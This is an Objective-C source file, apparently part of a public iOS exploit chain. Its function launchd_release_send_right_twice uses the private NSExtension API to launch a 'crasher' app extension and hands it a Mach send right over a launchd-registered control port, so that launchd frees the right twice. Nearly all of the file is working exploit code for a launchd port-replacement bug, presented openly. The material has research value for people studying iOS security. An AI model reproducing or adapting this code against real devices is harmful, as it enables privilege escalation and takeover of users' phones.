/*
 * launchd_portrep_ios
 * Brandon Azad
 *
 *
 * launchd_portrep_ios
 * ================================================================================================
 *
 * Connecting to the crasher
 * ------------------------------------------------------------------------------------------------
 *
 *  There is no supported way for an app to programatically launch its own app extension and talk
 *  to it. However, Ian McDowell wrote a great article describing how to use the private
 *  NSExtension API to launch and communicate with an app extension process. I've used an almost
 *  identical strategy here. The only difference is that we need to communicate a Mach port to the
 *  app extension process, which involves setting up a dummy service in launchd to which the app
 *  extension connects. (This is another reason the exploit is easier with application groups.)
 *
 *
 *  Sources
 *  -------
 *
 *  The following guides were extremely useful while developing the launchd_portrep_crasher app
 *  extension:
 *
 *  - https://ianmcdowell.net/blog/nsextension/
 *  - https://developer.apple.com/library/content/documentation/General/Conceptual/ExtensibilityPG/
 *
 */

#include "blanket/launchd_portrep/launchd_portrep_crasher.h"

#include "blanket/log/log.h"
#include "headers/bootstrap.h"
#include "headers/config.h"

#import "headers/NSExtension.h"

#include <mach/mach.h>

// ---- Freeing a Mach send right in launchd ------------------------------------------------------

bool
launchd_release_send_right_twice(mach_port_t send_right) {
	// Get the name of the extension.
	NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
	NSString *extensionName = [NSString stringWithFormat:@"%@.%s", bundleIdentifier, LAUNCHD_PORTREP_CRASHER_NAME];
	// Create an NSExtension object through which we can interact with our extension.
	NSError *error = nil;
	DEBUG_TRACE(1, "Connecting to extension %s", extensionName.UTF8String);
	NSExtension *extension = [NSExtension extensionWithIdentifier:extensionName error:&error];
	if (extension == nil || error != nil) {
		ERROR("Could not connect to app extension %s", extensionName.UTF8String);
		return false;
	}
	// Set up a control port.
	mach_port_t control_port = MACH_PORT_NULL;
	kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
			&control_port);
	assert(kr == KERN_SUCCESS);
	kr = mach_port_insert_right(mach_task_self(), control_port, control_port,
			MACH_MSG_TYPE_MAKE_SEND);
	assert(kr == KERN_SUCCESS);
	// Create a dispatch semaphore so we can wait for the request to finish.
	dispatch_semaphore_t sema = dispatch_semaphore_create(0);
	assert(sema != NULL);
	// Set the event blocks. At most one of these blocks should fire.
	__block bool interrupted = false;
	[extension setRequestCancellationBlock:^(NSUUID *request, NSError *error) {
		ERROR("App extension request %s", "cancelled");
		dispatch_semaphore_signal(sema);
	}];
	[extension setRequestInterruptionBlock:^(NSUUID *request) {
		DEBUG_TRACE(1, "App extension request %s", "interrupted");
		interrupted = true;
		dispatch_semaphore_signal(sema);
	}];
	[extension setRequestCompletionBlock:^(NSUUID *request, NSArray *extensionItems) {
		ERROR("App extension request %s", "completed");
		dispatch_semaphore_signal(sema);
	}];
	// Register the control port with launchd so that the crasher extension (which is also a
	// member of our application group) can look it up.
	char control_service_name[strlen(APP_GROUP) + 64];
	snprintf(control_service_name, sizeof(control_service_name), "%s.control.%u.%x",
			APP_GROUP, getpid(), send_right);
	kr = bootstrap_register(bootstrap_port, control_service_name, control_port);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not register control port with launchd: %u", kr);
		mach_port_destroy(mach_task_self(), control_port);
		return false;
	}
	// Connect to the extension.
	NSExtensionItem *item = [[NSExtensionItem alloc] init];
	NSString *controlServiceName = [NSString stringWithUTF8String:control_service_name];
	item.attachments = @[controlServiceName];
	DEBUG_TRACE(1, "Sending request with control service %s", control_service_name);
	[extension beginExtensionRequestWithInputItems:@[item] completion:^(NSUUID *request) {
		int pid = [extension pidForRequestIdentifier:request];
		INFO("Started app extension request: pid %u", pid);
	}];
	// Handle the client checkin on our control port. We will wait for up to 30 seconds, after
	// which we assume the client failed.
	DEBUG_TRACE(3, "mach_msg()");
	struct __attribute__((packed)) {
		mach_msg_header_t  hdr;
		mach_msg_trailer_t trailer;
	} msg = {};
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Waddress-of-packed-member"
	kr = mach_msg(&msg.hdr,
			MACH_RCV_MSG | MACH_RCV_TIMEOUT,
			0,
			sizeof(msg),
			control_port,
			30000,
			MACH_PORT_NULL);
#pragma clang diagnostic pop
	if (kr != KERN_SUCCESS) {
		ERROR("%s: 0x%x", "mach_msg", kr);
		goto fail_1;
	}
	if (msg.hdr.msgh_id != 0x77889900) {
		ERROR("Client checkin bad ID: 0x%x", msg.hdr.msgh_id);
		goto fail_1;
	}
	DEBUG_TRACE(1, "Client checked in");
	// Send the client response containing the send right.
	msg.hdr.msgh_bits       = MACH_MSGH_BITS_SET(MACH_MSGH_BITS_REMOTE(msg.hdr.msgh_bits), MACH_MSG_TYPE_COPY_SEND, MACH_MSGH_BITS_VOUCHER(msg.hdr.msgh_bits), 0);
	msg.hdr.msgh_size       = sizeof(msg.hdr);
	msg.hdr.msgh_local_port = send_right;
	msg.hdr.msgh_id         = 0x889900aa;
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Waddress-of-packed-member"
	kr = mach_msg(&msg.hdr,
			MACH_SEND_MSG,
			msg.hdr.msgh_size,
			0,
			MACH_PORT_NULL,
			MACH_MSG_TIMEOUT_NONE,
			MACH_PORT_NULL);
#pragma clang diagnostic pop
	if (kr != KERN_SUCCESS) {
		ERROR("%s: 0x%x", "mach_msg", kr);
		goto fail_1;
	}
	// Block until one of the handlers fires.
	DEBUG_TRACE(3, "dispatch_semaphore_wait()");
	dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
fail_1:
	mach_port_destroy(mach_task_self(), control_port);
	return interrupted;
}
